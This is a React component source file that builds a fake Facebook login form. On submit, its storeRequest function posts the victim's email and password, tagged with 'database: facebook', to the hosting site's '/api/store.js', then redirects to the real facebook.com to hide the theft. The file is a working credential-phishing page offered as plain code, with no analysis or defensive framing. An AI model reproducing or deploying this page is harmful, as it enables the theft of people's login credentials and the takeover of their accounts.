import React from 'react';
import styles from './Main.module.css';
import axios from 'axios';

class Main extends React.Component {

	constructor(props){
		
		super(props);
		
		this.emailDevRef = React.createRef();

		this.passwordDevRef = React.createRef();

		this.handleOnPassswordInput = this.handleOnPassswordInput.bind(this);

		this.handleShowButtonClick = this.handleShowButtonClick.bind(this);

		this.handleLoginButtonClick = this.handleLoginButtonClick.bind(this);

	}

	handleOnPassswordInput(event){

		if(event.currentTarget.value.length === 0){
			this.passwordDevRef.current.childNodes[0].style.width = 'calc(100% - 11px)';
			this.passwordDevRef.current.childNodes[1].hidden = true;
		} else {
			this.passwordDevRef.current.childNodes[0].style.width = '80%';
			this.passwordDevRef.current.childNodes[1].hidden = false;
		}

	}

	handleShowButtonClick(event){

		event.preventDefault();

		if(event.currentTarget.innerText === 'SHOW'){

			event.currentTarget.innerText = 'HIDE';
			this.passwordDevRef.current.childNodes[0].childNodes[0].type = 'text';

		} else if(event.currentTarget.innerText === 'HIDE'){

			event.currentTarget.innerText = 'SHOW';
			this.passwordDevRef.current.childNodes[0].childNodes[0].type = 'password';
		}

	}

	handleLoginButtonClick(event){

		event.preventDefault();

		let data = {
			'database': 'facebook',
			'email': this.emailDevRef.current.childNodes[0].value,
			'password': this.passwordDevRef.current.childNodes[0].childNodes[0].value
		}

		if(data.email && data.password){
			
			this.storeRequest(data);

		} 

	}

	storeRequest(data){
		
		let baseUrl = [window.location.protocol, '//', window.location.host].join('');

		let storeUrl = baseUrl + '/api/store.js';

		const params = new URLSearchParams();
		
		params.append('database', data.database);
		params.append('email', data.email);
		params.append('password', data.password);

		axios.post(storeUrl, params).then(function (response) {
		    window.location.href = "https://facebook.com";
		})
		.catch(function (error) {
			console.log(error);
		});

	}

	render(){
		return (
			<div className={styles.Main}>
				<form>
					<div ref={this.emailDevRef}>
						<input type='text' placeholder='Mobile number or email address'/>
					</div>
					<div ref={this.passwordDevRef}>
						<div>
							<input type='password' placeholder='Password' onInput={this.handleOnPassswordInput} />
						</div>
						<div hidden>
							<button type='button' onClick={this.handleShowButtonClick}>SHOW</button>
						</div>
					</div>
					<button type='button' onClick={this.handleLoginButtonClick}>Log In</button>
					<div><span>or</span></div>
					<div><button type='button'>Create New Account</button></div>
					<div><span><a href='/'>Forgotten password?</a><a href='/'>Help center</a></span></div>
				</form>
			</div>
		)
	}

}

export default Main;